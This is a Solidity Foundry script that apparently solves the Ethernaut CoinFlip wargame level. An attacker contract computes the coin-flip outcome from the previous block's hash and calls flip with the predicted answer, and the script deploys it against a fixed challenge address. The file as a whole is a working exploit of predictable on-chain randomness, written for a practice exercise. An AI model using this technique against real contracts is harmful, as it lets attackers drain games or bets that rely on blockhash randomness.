// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/CoinFlip.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Attacker {
    CoinFlip public coin;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coin) {
        coin = _coin;
        attack();
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side) {
            coin.flip(true);
        } else {
            coin.flip(false);
        }
    }
}

contract CoinFlipScript is Script {
    address constant ETHERNAUT_CONTRACT_ADDRESS = 0x1dD8BF245fd5E27697dc06c8434E84288d119471;
    CoinFlip public coin = CoinFlip(ETHERNAUT_CONTRACT_ADDRESS);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // 1. cheat on local chain
        // for (uint8 i = 0; i < 10; i++) {
        //     vm.roll(i + 1);
        //     new Attacker(coin);
        // }

        // 2. to run 10 times with --broadcast
        new Attacker(coin);

        console.log("===> WINS", coin.consecutiveWins());

        vm.stopBroadcast();
    }
}
